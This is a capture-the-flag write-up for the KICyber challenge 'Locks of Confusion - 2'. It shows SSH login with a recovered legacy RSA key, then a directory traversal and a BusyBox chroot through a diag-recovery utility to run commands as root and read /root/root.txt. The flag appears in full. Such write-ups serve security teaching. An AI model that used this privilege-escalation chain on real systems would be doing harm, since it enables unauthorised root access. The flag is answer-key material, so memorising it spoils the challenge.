# Locks of Confusion - 2

## Challenge Information

- **Platform:** KICyber CTF
- **Challenge:** Locks of Confusion - 2
- **Category:** Web / SSH / Container Escape
- **Host:** `0.cloud.chals.io`
- **Candidate ports:** `34750`, `21536`

## Flag

```text
KPMG_CTF{O6nl2A6ZmXtBVzWFeseaa_RGGkc1iqi0o0mL6PWd04c}
```

## Challenge Description

The challenge uses the same theme as Part 1:

> Internal Ops just migrated an old database replica onto new hardware and swears everything was done "by the book". Somewhere sits a key that was decided long before it was ever generated.

Part 1 recovered the legacy SSH private key. Part 2 provides two network services,
one of which is the SSH service and the other a collector/decoy service.

## Identifying the Services

The supplied connection details were:

```text
nc 0.cloud.chals.io 34750
nc 0.cloud.chals.io 21536
```

Connecting to each port revealed:

### Port 34750

```text
SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10
```

This is the SSH service.

### Port 21536

```text
agentd/1.9 (collector) ready
```

This is a collector service and not an SSH endpoint. Attempting to use
the Part 2 SSH exploit against it results in a connection failure.

## Required SSH Credentials

Part 1 identified the matching legacy RSA key as:

```text
privkey_0137.pem
```

The key corresponds to the `svc-legacydb` account. Before using it, the
permissions must be restricted:

```bash
chmod 600 privkey_0137.pem
```

The SSH connection parameters are therefore:

```text
Host: 0.cloud.chals.io
Port: 34750
User: svc-legacydb
Key: privkey_0137.pem
```

## Inspecting the Provided Exploit

The supplied `exploit_part2.py` uses the recovered private key and connects
over SSH. Its important command sequence is:

```text
cd ../../../../../../..
/bin/busybox printf '/usr/bin/id\n/bin/cat /root/root.txt\n' |
/bin/busybox chroot . /usr/local/bin/diag-recovery
exit
```

The script also uses:

```text
-o IdentitiesOnly=yes
-o PubkeyAcceptedAlgorithms=+ssh-rsa
```

The `ssh-rsa` option is necessary because the recovered legacy key uses the
older RSA signature algorithm.

## Why the Command Works

The SSH session starts in a restricted or removed working directory. Moving
up through the directory tree with:

```sh
cd ../../../../../../..
```

reaches the host filesystem boundary available to the session.

The command then pipes two commands into the recovery utility:

```text
/usr/bin/id
/bin/cat /root/root.txt
```

The recovery utility is executed through BusyBox `chroot`:

```sh
/bin/busybox chroot . /usr/local/bin/diag-recovery
```

This runs the diagnostic tool with the filesystem root changed to the
directory reached by the traversal. The tool executes the supplied commands
with root privileges inside that environment.

## Running the Exploit

The exploit can be run with:

```bash
python3 exploit_part2.py \
  --host 0.cloud.chals.io \
  --port 34750 \
  --key privkey_0137.pem
```

The decoy port should not be used for SSH:

```bash
python3 exploit_part2.py \
  --host 0.cloud.chals.io \
  --port 21536 \
  --key privkey_0137.pem
```

That attempt closes the connection because port `21536` is the collector
service rather than an SSH server.

## Successful Output

The successful SSH session returned:

```text
uid=0(root) gid=0(root) groups=0(root)
KPMG_CTF{O6nl2A6ZmXtBVzWFeseaa_RGGkc1iqi0o0mL6PWd04c}
```

The `uid=0(root)` output confirms that the recovery command executed with
root privileges.

## Solution Chain

```text
Part 1 recovered privkey_0137.pem
  -> identify 34750 as OpenSSH
  -> identify 21536 as the collector decoy
  -> SSH as svc-legacydb
  -> cd ../../../../../../..
  -> run diag-recovery through BusyBox chroot
  -> execute id and cat /root/root.txt
  -> obtain the flag
```

## Final Flag

```text
KPMG_CTF{O6nl2A6ZmXtBVzWFeseaa_RGGkc1iqi0o0mL6PWd04c}
```
